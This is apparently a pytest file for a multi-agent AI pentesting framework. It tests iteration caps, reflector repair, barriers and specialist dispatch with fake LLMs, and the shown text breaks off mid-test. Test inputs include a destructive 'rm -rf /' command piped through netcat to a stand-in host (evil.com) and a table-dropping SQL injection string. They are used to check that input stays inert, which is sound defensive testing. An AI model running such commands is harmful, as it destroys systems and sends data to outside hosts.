"""tests/brutal/test_agents_brutal.py — 200 brutal tests for the agents system.

Tests cover: base infrastructure, PrimaryAgent, 4 execution specialists
(Searcher/Pentester/Coder/Installer), Memorist/Adviser/Enricher,
Generator/Refiner/Reporter, and auxiliary agents
(Reflector/Summarizer/ToolCallFixer/Assistant).

The tests are deliberately aggressive — they probe edge cases (empty / very
long / unicode / shell-metachar input), security concerns (PII
anonymization, prompt-injection attempts, schema-validation strictness),
race conditions (concurrent ``run()`` invocations on a shared instance),
resource exhaustion (iteration caps, oversized inputs), and error
propagation (LLM / tool / reflector exceptions).

All tests are deterministic — no real network calls, no real LLM calls.
LLM clients and tool executors are replaced with in-process fakes that
return canned responses.
"""

from __future__ import annotations

import asyncio
import json
import logging
import random
import string
import sys
import time
from contextvars import ContextVar
from dataclasses import dataclass, field
from typing import Any, AsyncIterator, Optional
from unittest.mock import AsyncMock, MagicMock, patch

import pytest
from pydantic import ValidationError

from elengenix.agents.base import (
    MAX_AGENT_SHUTDOWN_ITERATIONS,
    MAX_GENERAL_ITERATIONS,
    MAX_LIMITED_ITERATIONS,
    MAX_REFLECTOR_CALLS_PER_CHAIN,
    AgentContext,
    AgentType,
    LLMClient,
    LLMResponse,
    Message,
    PerformResult,
    Reflector,
    Summarizer,
    ToolCall,
    ToolExecutor,
    default_max_iterations,
    is_general_agent,
    is_limited_agent,
    perform_agent_chain,
)
from elengenix.agents.primary_agent import (
    ADVICE_TOOL_NAME,
    ASK_TOOL_NAME,
    BARRIER_TOOL_NAMES,
    CODER_TOOL_NAME,
    DONE_TOOL_NAME,
    MAINTENANCE_TOOL_NAME,
    MEMORIST_TOOL_NAME,
    PENTESTER_TOOL_NAME,
    PRIMARY_AGENT_SYSTEM_PROMPT_TEMPLATE,
    SEARCH_TOOL_NAME,
    SPECIALIST_TOOL_NAMES,
    PrimaryAgent,
    PrimaryAgentRunStats,
    render_system_prompt,
)
from elengenix.agents.searcher import (
    SEARCH_RESULT_TOOL_NAME,
    Searcher,
)
from elengenix.agents.pentester import (
    HACK_RESULT_TOOL_NAME,
    PENTEST_DOCKER_IMAGE,
    Pentester,
)
from elengenix.agents.coder import (
    CODE_RESULT_TOOL_NAME,
    Coder,
)
from elengenix.agents.installer import (
    Installer,
)
from elengenix.agents.memorist import (
    MEMORIST_RESULT_TOOL_NAME,
    Memorist,
    anonymize,
)
from elengenix.agents.adviser import (
    AdviceResult,
    Adviser,
    AskAdvice,
)
from elengenix.agents.enricher import (
    ENRICHER_RESULT_TOOL_NAME,
    Enricher,
    EnricherResult,
)
from elengenix.agents.generator import (
    Generator,
    SubtaskInfo,
    SubtaskList,
    SubtaskListToolName,
    TasksNumberLimit,
)
from elengenix.agents.refiner import (
    Refiner,
    SubtaskPatch,
    SubtaskPatchOp,
    SubtaskPatchToolName,
)
from elengenix.agents.reporter import (
    ReportMessageLengthLimit,
    ReportResultLengthLimit,
    ReportResultToolName,
    Reporter,
    TaskResult,
)
from elengenix.agents.reflector import (
    REFLECTOR_SYSTEM_PROMPT,
    Reflector as ReflectorAgent,
)
from elengenix.agents.summarizer import (
    GEMINI_FAKE_THOUGHT_SIGNATURE,
    SUMMARIZED_CONTENT_PREFIX,
    SUMMARY_TOOL_NAME,
    SUMMARIZER_SYSTEM_PROMPT,
    BodyPair,
    BodyPairType,
    ChainAST,
    ChainSection,
    SectionHeader,
    Summarizer as SummarizerAgent,
    SummarizerConfig,
    build_chain_ast,
    contains_summarized_content,
    serialize_chain,
)
from elengenix.agents.toolcall_fixer import (
    TOOLCALL_FIXER_SYSTEM_PROMPT,
    ToolCallFixer,
)
from elengenix.agents.assistant import (
    ASSISTANT_SYSTEM_PROMPT,
    Assistant,
    AssistantConversation,
    ChatTurn,
    ToolInvocation,
    ToolSpec,
    _parse_tool_call_chunk,
)

# ---------------------------------------------------------------------------
# Fakes & helpers
# ---------------------------------------------------------------------------


class FakeLLMClient:
    """In-process LLM client whose responses come from a FIFO queue.

    Each call pops one response off the queue so tests can pre-program a
    deterministic multi-turn trajectory.
    """

    def __init__(self, responses: list[LLMResponse] | None = None) -> None:
        self._responses: list[LLMResponse] = list(responses or [])
        self.calls: list[dict[str, Any]] = []

    def push(self, resp: LLMResponse) -> None:
        """Enqueue one more response (useful for long chains)."""
        self._responses.append(resp)

    async def call(
        self,
        chain: list[Message],
        tools: list[dict[str, Any]] | None = None,
        agent_type: AgentType | None = None,
    ) -> LLMResponse:
        self.calls.append(
            {
                "chain_len": len(chain),
                "tools": tools,
                "agent_type": agent_type,
            }
        )
        if not self._responses:
            return LLMResponse(content="(no more canned responses)", tool_calls=[])
        return self._responses.pop(0)


class FailingLLMClient:
    """LLM client that always raises a specified exception."""

    def __init__(self, exc: Exception) -> None:
        self._exc = exc
        self.calls = 0

    async def call(
        self,
        chain: list[Message],
        tools: list[dict[str, Any]] | None = None,
        agent_type: AgentType | None = None,
    ) -> LLMResponse:
        self.calls += 1
        raise self._exc


class FakeToolExecutor:
    """In-process tool executor: routes by name, supports barrier set."""

    def __init__(
        self,
        handlers: dict[str, Any] | None = None,
        barriers: set[str] | None = None,
        schemas: list[dict[str, Any]] | None = None,
    ) -> None:
        self._handlers = handlers or {}
        self._barriers = barriers or set()
        self._schemas = schemas or []
        self.calls: list[tuple[str, str]] = []

    async def execute(
        self,
        name: str,
        arguments: str,
        context: AgentContext | None = None,
    ) -> str:
        self.calls.append((name, arguments))
        handler = self._handlers.get(name)
        if handler is None:
            return f"unknown tool: {name}"
        result = handler(arguments, context)
        if asyncio.iscoroutine(result):
            result = await result
        return result if isinstance(result, str) else json.dumps(result)

    def is_barrier(self, name: str) -> bool:
        return name in self._barriers

    def get_tools(self) -> list[dict[str, Any]]:
        return [dict(s) for s in self._schemas]


class FakeReflector:
    """Reflector stub: returns a pre-set LLMResponse."""

    def __init__(self, response: LLMResponse, raise_exc: Exception | None = None) -> None:
        self._response = response
        self._raise = raise_exc
        self.calls = 0

    async def reflect(
        self,
        agent_type: AgentType,
        chain: list[Message],
        content: str,
        execution_context: str = "",
    ) -> LLMResponse:
        self.calls += 1
        if self._raise is not None:
            raise self._raise
        return self._response


class FakeSummarizer:
    """Summarizer stub: returns a pre-set chain (or no-op)."""

    def __init__(self, replacement: list[Message] | None = None, raise_exc: Exception | None = None) -> None:
        self._replacement = replacement
        self._raise = raise_exc
        self.calls = 0

    async def summarize(self, chain: list[Message]) -> list[Message]:
        self.calls += 1
        if self._raise is not None:
            raise self._raise
        if self._replacement is None:
            return chain
        return self._replacement


def _tc(name: str = "search", args: dict[str, Any] | None = None) -> ToolCall:
    """Build a ToolCall with a JSON-encoded arguments payload."""
    return ToolCall(name=name, arguments=json.dumps(args or {}))


def _done_tc(success: bool = True, result: str = "ok", message: str = "done") -> ToolCall:
    return ToolCall(
        name=DONE_TOOL_NAME,
        arguments=json.dumps({"success": success, "result": result, "message": message}),
    )


def _ask_tc(message: str = "waiting") -> ToolCall:
    return ToolCall(name=ASK_TOOL_NAME, arguments=json.dumps({"message": message}))


def _primary_handlers(
    *,
    specialist_responses: dict[str, str] | None = None,
    barrier_response: str = "barrier-ack",
) -> dict[str, Any]:
    """Build the minimum-viable PrimaryAgent handlers dict."""
    specialist_responses = specialist_responses or {}

    def make(name: str) -> Any:
        async def _h(args: str, ctx: AgentContext | None = None) -> str:
            return specialist_responses.get(name, f"{name}-ack")

        return _h

    handlers: dict[str, Any] = {name: make(name) for name in SPECIALIST_TOOL_NAMES}

    async def _barrier(name: str, args: str, ctx: AgentContext | None = None) -> str:
        return barrier_response

    handlers["barrier"] = _barrier
    return handlers


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


@pytest.fixture
def mock_llm_client() -> FakeLLMClient:
    """A fresh FakeLLMClient with an empty queue (returns a fallback text)."""
    return FakeLLMClient()


@pytest.fixture
def mock_tool_executor() -> FakeToolExecutor:
    """A bare FakeToolExecutor with no handlers / barriers."""
    return FakeToolExecutor()


@pytest.fixture
def primary_agent(mock_llm_client: FakeLLMClient) -> PrimaryAgent:
    """A PrimaryAgent wired to the fake LLM + minimum handlers."""
    return PrimaryAgent(
        llm_client=mock_llm_client,
        tool_handlers=_primary_handlers(),
        max_iterations=10,
    )


@pytest.fixture
def clean_agent_context() -> None:
    """Reset the module-level AgentContext ContextVar before & after the test."""
    # Force-clear by setting None via the public API where possible.
    AgentContext._ctx_var.set(None)
    yield
    AgentContext._ctx_var.set(None)


# ===========================================================================
# SECTION 1 — Agent base infrastructure (40 tests)
# ===========================================================================


class TestAgentBase:
    """Brutal tests for the AgentType enum, PerformResult, iteration caps,
    classification helpers, and message/tool-call dataclasses."""

    # --- AgentType enum ----------------------------------------------------

    def test_agent_type_has_exactly_15_values(self) -> None:
        """The AgentType enum must expose exactly 15 distinct members."""
        assert len(list(AgentType)) == 15

    def test_agent_type_primary_value(self) -> None:
        """AgentType.PRIMARY serialises to 'primary_agent'."""
        assert AgentType.PRIMARY.value == "primary_agent"

    def test_agent_type_searcher_value(self) -> None:
        """AgentType.SEARCHER serialises to 'searcher'."""
        assert AgentType.SEARCHER.value == "searcher"

    def test_agent_type_pentester_value(self) -> None:
        """AgentType.PENTESTER serialises to 'pentester'."""
        assert AgentType.PENTESTER.value == "pentester"

    def test_agent_type_coder_value(self) -> None:
        """AgentType.CODER serialises to 'coder'."""
        assert AgentType.CODER.value == "coder"

    def test_agent_type_installer_value(self) -> None:
        """AgentType.INSTALLER serialises to 'installer'."""
        assert AgentType.INSTALLER.value == "installer"

    def test_agent_type_memorist_value(self) -> None:
        """AgentType.MEMORIST serialises to 'memorist'."""
        assert AgentType.MEMORIST.value == "memorist"

    def test_agent_type_adviser_value(self) -> None:
        """AgentType.ADVISER serialises to 'adviser'."""
        assert AgentType.ADVISER.value == "adviser"

    def test_agent_type_is_subclass_of_str(self) -> None:
        """AgentType members behave as str instances (string coercion)."""
        assert isinstance(AgentType.PRIMARY, str)
        # The .value attribute is the wire string.
        assert AgentType.PRIMARY.value == "primary_agent"

    def test_agent_type_hashable_and_equality_with_string(self) -> None:
        """AgentType members hash equal to their string value (enum-as-str)."""
        assert hash(AgentType.PRIMARY) == hash("primary_agent")
        assert AgentType.PRIMARY == "primary_agent"

    def test_agent_type_lookup_by_string_value(self) -> None:
        """AgentType(value) round-trips for every known wire value."""
        for member in AgentType:
            assert AgentType(member.value) is member

    # --- PerformResult enum ------------------------------------------------

    def test_perform_result_done_value(self) -> None:
        """PerformResult.DONE serialises to 'done'."""
        assert PerformResult.DONE.value == "done"

    def test_perform_result_waiting_value(self) -> None:
        """PerformResult.WAITING serialises to 'waiting'."""
        assert PerformResult.WAITING.value == "waiting"

    def test_perform_result_error_value(self) -> None:
        """PerformResult.ERROR serialises to 'error'."""
        assert PerformResult.ERROR.value == "error"

    # --- Iteration cap constants ------------------------------------------

    def test_max_general_iterations_is_100(self) -> None:
        """General agents (PrimaryAgent, Pentester, Coder, Installer, Assistant) cap at 100 iterations."""
        assert MAX_GENERAL_ITERATIONS == 100

    def test_max_limited_iterations_is_20(self) -> None:
        """Limited agents cap at 20 iterations."""
        assert MAX_LIMITED_ITERATIONS == 20

    # --- Classification helpers --------------------------------------------

    def test_is_general_agent_returns_true_for_primary(self) -> None:
        """is_general_agent(PRIMARY) → True (100-iteration cap)."""
        assert is_general_agent(AgentType.PRIMARY) is True

    def test_is_general_agent_returns_true_for_pentester(self) -> None:
        """is_general_agent(PENTESTER) → True."""
        assert is_general_agent(AgentType.PENTESTER) is True

    def test_is_general_agent_returns_true_for_coder(self) -> None:
        """is_general_agent(CODER) → True."""
        assert is_general_agent(AgentType.CODER) is True

    def test_is_general_agent_returns_true_for_installer(self) -> None:
        """is_general_agent(INSTALLER) → True."""
        assert is_general_agent(AgentType.INSTALLER) is True

    def test_is_general_agent_returns_true_for_assistant(self) -> None:
        """is_general_agent(ASSISTANT) → True."""
        assert is_general_agent(AgentType.ASSISTANT) is True

    def test_is_limited_agent_returns_true_for_searcher(self) -> None:
        """is_limited_agent(SEARCHER) → True."""
        assert is_limited_agent(AgentType.SEARCHER) is True

    def test_is_limited_agent_returns_true_for_memorist(self) -> None:
        """is_limited_agent(MEMORIST) → True."""
        assert is_limited_agent(AgentType.MEMORIST) is True

    def test_is_limited_agent_returns_true_for_adviser(self) -> None:
        """is_limited_agent(ADVISER) → True."""
        assert is_limited_agent(AgentType.ADVISER) is True

    def test_is_limited_agent_returns_true_for_generator(self) -> None:
        """is_limited_agent(GENERATOR) → True."""
        assert is_limited_agent(AgentType.GENERATOR) is True

    def test_is_limited_agent_returns_true_for_refiner(self) -> None:
        """is_limited_agent(REFINER) → True."""
        assert is_limited_agent(AgentType.REFINER) is True

    def test_is_limited_agent_returns_true_for_reporter(self) -> None:
        """is_limited_agent(REPORTER) → True."""
        assert is_limited_agent(AgentType.REPORTER) is True

    def test_default_max_iterations_general_vs_limited(self) -> None:
        """default_max_iterations resolves to 100 for general, 20 for limited."""
        assert default_max_iterations(AgentType.PRIMARY) == 100
        assert default_max_iterations(AgentType.SEARCHER) == 20

    # --- ToolCall / Message / LLMResponse dataclasses ---------------------

    def test_tool_call_default_id_is_unique_string(self) -> None:
        """A ToolCall without an id gets a unique 'call_<hex>' string."""
        tc1 = ToolCall()
        tc2 = ToolCall()
        assert tc1.id.startswith("call_")
        assert tc2.id.startswith("call_")
        assert tc1.id != tc2.id

    def test_message_role_required(self) -> None:
        """Message requires a role string."""
        m = Message(role="system")
        assert m.role == "system"
        assert m.content == ""
        assert m.tool_calls == []


# ===========================================================================
# SECTION 2 — perform_agent_chain + AgentContext (10 tests)
# ===========================================================================


class TestPerformAgentChainAndContext:
    """Brutal tests for the universal chain loop and AgentContext propagation."""

    async def test_chain_empty_message_returns_error_when_no_tool_calls_no_reflector(
        self, mock_llm_client: FakeLLMClient, mock_tool_executor: FakeToolExecutor
    ) -> None:
        """A content-only response with no reflector terminates with ERROR."""
        mock_llm_client.push(LLMResponse(content="hello", tool_calls=[]))
        chain = [Message(role="user", content="hi")]
        result = await perform_agent_chain(
            agent_type=AgentType.PRIMARY,
            chain=chain,
            llm_client=mock_llm_client,
            executor=mock_tool_executor,
        )
        assert result == PerformResult.ERROR

    async def test_chain_single_barrier_tool_terminates_done(
        self, mock_llm_client: FakeLLMClient
    ) -> None:
        """A barrier tool with no on_barrier callback returns DONE by default."""
        mock_llm_client.push(
            LLMResponse(content="", tool_calls=[_tc("done", {"success": True})])
        )
        executor = FakeToolExecutor(handlers={"done": lambda a, c: "ok"}, barriers={"done"})
        chain = [Message(role="user", content="x")]
        result = await perform_agent_chain(
            agent_type=AgentType.PRIMARY,
            chain=chain,
            llm_client=mock_llm_client,
            executor=executor,
        )
        assert result == PerformResult.DONE

    async def test_chain_iteration_cap_exceeded_returns_error(
        self, mock_llm_client: FakeLLMClient
    ) -> None:
        """When the LLM keeps emitting tool calls forever, the iteration cap returns ERROR."""
        # Each iteration: 1 non-barrier tool call (loop continues).
        for _ in range(50):
            mock_llm_client.push(LLMResponse(content="", tool_calls=[_tc("noop")]))
        executor = FakeToolExecutor(handlers={"noop": lambda a, c: "ok"})
        chain = [Message(role="user", content="x")]
        result = await perform_agent_chain(
            agent_type=AgentType.PRIMARY,
            chain=chain,
            llm_client=mock_llm_client,
            executor=executor,
            max_iterations=5,
        )
        assert result == PerformResult.ERROR

    async def test_chain_no_tool_call_reflector_injection_repairs_response(
        self, mock_llm_client: FakeLLMClient
    ) -> None:
        """When the LLM emits no tool call, the reflector is invoked once and its repaired response is used."""
        mock_llm_client.push(LLMResponse(content="free text", tool_calls=[]))
        repaired = LLMResponse(content="", tool_calls=[_tc("done", {"success": True})])
        reflector = FakeReflector(response=repaired)
        executor = FakeToolExecutor(handlers={"done": lambda a, c: "ok"}, barriers={"done"})
        chain = [Message(role="user", content="x")]
        result = await perform_agent_chain(
            agent_type=AgentType.PRIMARY,
            chain=chain,
            llm_client=mock_llm_client,
            executor=executor,
            reflector=reflector,
        )
        assert result == PerformResult.DONE
        assert reflector.calls == 1

    async def test_chain_reflector_returns_no_tool_calls_returns_error(
        self, mock_llm_client: FakeLLMClient
    ) -> None:
        """If the reflector itself returns no tool calls, the chain returns ERROR."""
        mock_llm_client.push(LLMResponse(content="free text", tool_calls=[]))
        reflector = FakeReflector(response=LLMResponse(content="still no tool", tool_calls=[]))
        executor = FakeToolExecutor()
        chain = [Message(role="user", content="x")]
        result = await perform_agent_chain(
            agent_type=AgentType.PRIMARY,
            chain=chain,
            llm_client=mock_llm_client,
            executor=executor,
            reflector=reflector,
        )
        assert result == PerformResult.ERROR

    async def test_chain_llm_exception_returns_error(self) -> None:
        """An LLM exception is swallowed and the chain returns ERROR."""
        llm = FailingLLMClient(RuntimeError("boom"))
        executor = FakeToolExecutor()
        chain = [Message(role="user", content="x")]
        result = await perform_agent_chain(
            agent_type=AgentType.PRIMARY,
            chain=chain,
            llm_client=llm,
            executor=executor,
        )
        assert result == PerformResult.ERROR

    async def test_chain_tool_execution_exception_returns_error(
        self, mock_llm_client: FakeLLMClient
    ) -> None:
        """A tool-execution exception is swallowed and the chain returns ERROR."""
        mock_llm_client.push(LLMResponse(content="", tool_calls=[_tc("boom")]))

        def boom(args: str, ctx: Any) -> str:
            raise RuntimeError("tool exploded")

        executor = FakeToolExecutor(handlers={"boom": boom})
        chain = [Message(role="user", content="x")]
        result = await perform_agent_chain(
            agent_type=AgentType.PRIMARY,
            chain=chain,
            llm_client=mock_llm_client,
            executor=executor,
        )
        assert result == PerformResult.ERROR

    async def test_chain_barrier_callback_exception_defaults_to_done(
        self, mock_llm_client: FakeLLMClient
    ) -> None:
        """If the on_barrier callback raises, the chain returns DONE (defensive)."""
        mock_llm_client.push(LLMResponse(content="", tool_calls=[_tc("done")]))
        executor = FakeToolExecutor(handlers={"done": lambda a, c: "ok"}, barriers={"done"})

        def bad_barrier(name: str, args: str) -> PerformResult:
            raise RuntimeError("barrier broken")

        chain = [Message(role="user", content="x")]
        result = await perform_agent_chain(
            agent_type=AgentType.PRIMARY,
            chain=chain,
            llm_client=mock_llm_client,
            executor=executor,
            on_barrier=bad_barrier,
        )
        assert result == PerformResult.DONE

    async def test_chain_summarizer_invoked_after_tool_dispatch(
        self, mock_llm_client: FakeLLMClient
    ) -> None:
        """When a summarizer is configured, it is invoked once per iteration that doesn't hit a barrier."""
        # Iteration 1: non-barrier tool (summarizer fires after dispatch).
        mock_llm_client.push(LLMResponse(content="", tool_calls=[_tc("noop")]))
        # Iteration 2: barrier tool (summarizer does NOT fire — chain returns).
        mock_llm_client.push(LLMResponse(content="", tool_calls=[_tc("done", {"success": True})]))
        executor = FakeToolExecutor(
            handlers={"noop": lambda a, c: "ok", "done": lambda a, c: "ok"},
            barriers={"done"},
        )
        summarizer = FakeSummarizer(replacement=None)
        chain = [Message(role="user", content="x")]
        await perform_agent_chain(
            agent_type=AgentType.PRIMARY,
            chain=chain,
            llm_client=mock_llm_client,
            executor=executor,
            summarizer=summarizer,
        )
        assert summarizer.calls == 1

    async def test_agent_context_put_get_reset_round_trip(self, clean_agent_context: None) -> None:
        """AgentContext.put/get/reset round-trip cleanly."""
        assert AgentContext.get() is None
        token = AgentContext.put(AgentType.PRIMARY)
        ctx = AgentContext.get()
        assert ctx is not None
        assert ctx["current_agent_type"] == "primary_agent"
        assert ctx["parent_agent_type"] == "primary_agent"
        AgentContext.reset(token)
        assert AgentContext.get() is None


# ===========================================================================
# SECTION 3 — PrimaryAgent (30 tests)
# ===========================================================================


class TestPrimaryAgent:
    """Brutal tests for the PrimaryAgent root orchestrator."""

    def test_primary_agent_constructor_valid(self, mock_llm_client: FakeLLMClient) -> None:
        """A PrimaryAgent constructed with all required handlers stores them."""
        agent = PrimaryAgent(
            llm_client=mock_llm_client,
            tool_handlers=_primary_handlers(),
        )
        assert agent.agent_type == AgentType.PRIMARY

    async def test_primary_agent_constructor_missing_search_handler_raises(
        self, mock_llm_client: FakeLLMClient
    ) -> None:
        """Missing the 'search' specialist handler raises ValueError on run() (lazy validation)."""
        handlers = _primary_handlers()
        del handlers[SEARCH_TOOL_NAME]
        agent = PrimaryAgent(llm_client=mock_llm_client, tool_handlers=handlers)
        with pytest.raises(ValueError, match="missing required tool handlers"):
            await agent.run("subtask")

    async def test_primary_agent_constructor_missing_barrier_handler_raises(
        self, mock_llm_client: FakeLLMClient
    ) -> None:
        """Missing the 'barrier' handler raises ValueError on run() (lazy validation)."""
        handlers = _primary_handlers()
        del handlers["barrier"]
        agent = PrimaryAgent(llm_client=mock_llm_client, tool_handlers=handlers)
        with pytest.raises(ValueError, match="missing required tool handlers"):
            await agent.run("subtask")

    async def test_primary_agent_constructor_missing_all_handlers_raises(
        self, mock_llm_client: FakeLLMClient
    ) -> None:
        """An empty handlers dict raises ValueError on run() (lazy validation)."""
        agent = PrimaryAgent(llm_client=mock_llm_client, tool_handlers={})
        with pytest.raises(ValueError, match="missing required tool handlers"):
            await agent.run("subtask")

    def test_primary_agent_constructor_with_custom_max_iterations(
        self, mock_llm_client: FakeLLMClient
    ) -> None:
        """max_iterations is stored verbatim."""
        agent = PrimaryAgent(
            llm_client=mock_llm_client,
            tool_handlers=_primary_handlers(),
            max_iterations=42,
        )
        assert agent._max_iterations == 42

    def test_primary_agent_constructor_with_system_prompt_override(
        self, mock_llm_client: FakeLLMClient
    ) -> None:
        """A system_prompt override is used verbatim instead of the template."""
        agent = PrimaryAgent(
            llm_client=mock_llm_client,
            tool_handlers=_primary_handlers(),
            system_prompt="OVERRIDE",
        )
        assert agent._render_system_prompt() == "OVERRIDE"

    def test_primary_agent_agent_type_is_primary(self, primary_agent: PrimaryAgent) -> None:
        """agent_type property returns AgentType.PRIMARY."""
        assert primary_agent.agent_type is AgentType.PRIMARY

    async def test_primary_agent_run_with_empty_subtask(self, primary_agent: PrimaryAgent) -> None:
        """An empty subtask still drives the chain (no pre-validation)."""
        primary_agent._llm_client.push(
            LLMResponse(content="", tool_calls=[_done_tc()])
        )
        result = await primary_agent.run("")
        assert result == PerformResult.DONE

    async def test_primary_agent_run_with_10kb_subtask(self, primary_agent: PrimaryAgent) -> None:
        """A 10KB subtask description is accepted verbatim."""
        big = "x" * 10240
        primary_agent._llm_client.push(LLMResponse(content="", tool_calls=[_done_tc()]))
        result = await primary_agent.run(big)
        assert result == PerformResult.DONE
        # The user message in the chain carries the full description.
        user_msgs = [m for m in primary_agent.chain if m.role == "user"]
        assert user_msgs and len(user_msgs[0].content) == 10240

    async def test_primary_agent_run_with_unicode_subtask(self, primary_agent: PrimaryAgent) -> None:
        """Unicode (CJK + accented Latin) subtasks are accepted verbatim."""
        text = "德国 nuclei 扫描 — café résumé"
        primary_agent._llm_client.push(LLMResponse(content="", tool_calls=[_done_tc()]))
        await primary_agent.run(text)
        user_msgs = [m for m in primary_agent.chain if m.role == "user"]
        assert user_msgs and user_msgs[0].content == text

    async def test_primary_agent_run_with_emoji_subtask(self, primary_agent: PrimaryAgent) -> None:
        """Emoji subtasks are accepted verbatim."""
        text = "scan target 💀🚀 and report 📊"
        primary_agent._llm_client.push(LLMResponse(content="", tool_calls=[_done_tc()]))
        await primary_agent.run(text)
        user_msgs = [m for m in primary_agent.chain if m.role == "user"]
        assert user_msgs and user_msgs[0].content == text

    async def test_primary_agent_run_with_shell_metacharacters_subtask(
        self, primary_agent: PrimaryAgent
    ) -> None:
        """Shell metacharacters in the subtask are not interpreted by the orchestrator."""
        text = "; rm -rf / && echo pwned | nc evil.com 1337"
        primary_agent._llm_client.push(LLMResponse(content="", tool_calls=[_done_tc()]))
        result = await primary_agent.run(text)
        assert result == PerformResult.DONE

    async def test_primary_agent_run_with_sql_injection_subtask(
        self, primary_agent: PrimaryAgent
    ) -> None:
        """SQL injection fragments in the subtask are inert (text-only)."""
        text = "' OR '1'='1' -- ; DROP TABLE users;"
        primary_agent._llm_client.push(LLMResponse(content="", tool_calls=[_done_tc()]))
        result = await primary_agent.run(text)
        assert result == PerformResult.DONE

    async def test_primary_agent_run_delegates_to_search_specialist(
        self, mock_llm_client: FakeLLMClient
    ) -> None:
        """A 'search' tool call dispatches to the search handler."""
        called: list[str] = []

        async def search_h(args: str, ctx: Any) -> str:
            called.append("search")
            return "searched"

        handlers = _primary_handlers()
        handlers[SEARCH_TOOL_NAME] = search_h
        agent = PrimaryAgent(llm_client=mock_llm_client, tool_handlers=handlers, max_iterations=5)
        agent._llm_client.push(
            LLMResponse(content="", tool_calls=[_tc(SEARCH_TOOL_NAME, {"question": "q", "message": "m"})])
        )
        agent._llm_client.push(LLMResponse(content="", tool_calls=[_done_tc()]))
        await agent.run("subtask")
        assert called == ["search"]

    async def test_primary_agent_run_delegates_to_pentester_specialist(
        self, mock_llm_client: FakeLLMClient
    ) -> None:
        """A 'pentest' tool call dispatches to the pentester handler."""
        called: list[str] = []

        async def h(args: str, ctx: Any) -> str:
            called.append("pentest")
            return "ok"

        handlers = _primary_handlers()
        handlers[PENTESTER_TOOL_NAME] = h
        agent = PrimaryAgent(llm_client=mock_llm_client, tool_handlers=handlers, max_iterations=5)
        agent._llm_client.push(LLMResponse(content="", tool_calls=[_tc(PENTESTER_TOOL_NAME)]))
        agent._llm_client.push(LLMResponse(content="", tool_calls=[_done_tc()]))
        await agent.run("subtask")
        assert called == ["pentest"]

    async def test_primary_agent_run_delegates_to_coder_specialist(
        self, mock_llm_client: FakeLLMClient
    ) -> None:
        """A 'code' tool call dispatches to the coder handler."""
        called: list[str] = []

        async def h(args: str, ctx: Any) -> str:
            called.append("code")
            return "ok"

        handlers = _primary_handlers()
        handlers[CODER_TOOL_NAME] = h
        agent = PrimaryAgent(llm_client=mock_llm_client, tool_handlers=handlers, max_iterations=5)
        agent._llm_client.push(LLMResponse(content="", tool_calls=[_tc(CODER_TOOL_NAME)]))
        agent._llm_client.push(LLMResponse(content="", tool_calls=[_done_tc()]))
        await agent.run("subtask")
        assert called == ["code"]

    async def test_primary_agent_run_delegates_to_adviser_specialist(
        self, mock_llm_client: FakeLLMClient
    ) -> None:
        """An 'advice' tool call dispatches to the adviser handler."""
        called: list[str] = []

        async def h(args: str, ctx: Any) -> str:
            called.append("advice")
            return "ok"

        handlers = _primary_handlers()
        handlers[ADVICE_TOOL_NAME] = h
        agent = PrimaryAgent(llm_client=mock_llm_client, tool_handlers=handlers, max_iterations=5)
        agent._llm_client.push(LLMResponse(content="", tool_calls=[_tc(ADVICE_TOOL_NAME)]))
        agent._llm_client.push(LLMResponse(content="", tool_calls=[_done_tc()]))
        await agent.run("subtask")
        assert called == ["advice"]

    async def test_primary_agent_run_delegates_to_memorist_specialist(
        self, mock_llm_client: FakeLLMClient
    ) -> None:
        """A 'memorize' tool call dispatches to the memorist handler."""
        called: list[str] = []

        async def h(args: str, ctx: Any) -> str:
            called.append("memorize")
            return "ok"

        handlers = _primary_handlers()
        handlers[MEMORIST_TOOL_NAME] = h
        agent = PrimaryAgent(llm_client=mock_llm_client, tool_handlers=handlers, max_iterations=5)
        agent._llm_client.push(LLMResponse(content="", tool_calls=[_tc(MEMORIST_TOOL_NAME)]))
        agent._llm_client.push(LLMResponse(content="", tool_calls=[_done_tc()]))
        await agent.run("subtask")
        assert called == ["memorize"]

    async def test_primary_agent_run_delegates_to_installer_specialist(
        self, mock_llm_client: FakeLLMClient
    ) -> None:
        """A 'maintain' tool call dispatches to the installer handler."""
        called: list[str] = []

        async def h(args: str, ctx: Any) -> str:
            called.append("maintain")
            return "ok"

        handlers = _primary_handlers()
        handlers[MAINTENANCE_TOOL_NAME] = h
        agent = PrimaryAgent(llm_client=mock_llm_client, tool_handlers=handlers, max_iterations=5)
        agent._llm_client.push(LLMResponse(content="", tool_calls=[_tc(MAINTENANCE_TOOL_NAME)]))
        agent._llm_client.push(LLMResponse(content="", tool_calls=[_done_tc()]))
        await agent.run("subtask")
        assert called == ["maintain"]

    async def test_primary_agent_run_done_success_true_returns_done(
        self, primary_agent: PrimaryAgent
    ) -> None:
        """A 'done' barrier with success=True returns PerformResult.DONE."""
        primary_agent._llm_client.push(LLMResponse(content="", tool_calls=[_done_tc(success=True)]))
        result = await primary_agent.run("subtask")
        assert result == PerformResult.DONE
        assert primary_agent.stats.barrier_hit == DONE_TOOL_NAME

    async def test_primary_agent_run_done_success_false_returns_error(
        self, primary_agent: PrimaryAgent
    ) -> None:
        """A 'done' barrier with success=False returns PerformResult.ERROR."""
        primary_agent._llm_client.push(LLMResponse(content="", tool_calls=[_done_tc(success=False)]))
        result = await primary_agent.run("subtask")
        assert result == PerformResult.ERROR

    async def test_primary_agent_run_ask_returns_waiting(self, primary_agent: PrimaryAgent) -> None:
        """An 'ask' barrier returns PerformResult.WAITING."""
        primary_agent._llm_client.push(LLMResponse(content="", tool_calls=[_ask_tc()]))
        result = await primary_agent.run("subtask")
        assert result == PerformResult.WAITING
        assert primary_agent.stats.barrier_hit == ASK_TOOL_NAME

    async def test_primary_agent_run_iteration_cap_enforcement(
        self, mock_llm_client: FakeLLMClient
    ) -> None:
        """When max_iterations is hit, the chain returns ERROR."""
        for _ in range(20):
            mock_llm_client.push(LLMResponse(content="", tool_calls=[_tc("search")]))
        agent = PrimaryAgent(
            llm_client=mock_llm_client,
            tool_handlers=_primary_handlers(),
            max_iterations=5,
        )
        result = await agent.run("subtask")
        assert result == PerformResult.ERROR

    async def test_primary_agent_run_reflector_injection_on_no_tool_call(
        self, mock_llm_client: FakeLLMClient
    ) -> None:
        """A no-tool-call response triggers the reflector; the repaired response drives the chain."""
        mock_llm_client.push(LLMResponse(content="plain text", tool_calls=[]))
        repaired = LLMResponse(content="", tool_calls=[_done_tc()])
        reflector = FakeReflector(repaired)
        agent = PrimaryAgent(
            llm_client=mock_llm_client,
            tool_handlers=_primary_handlers(),
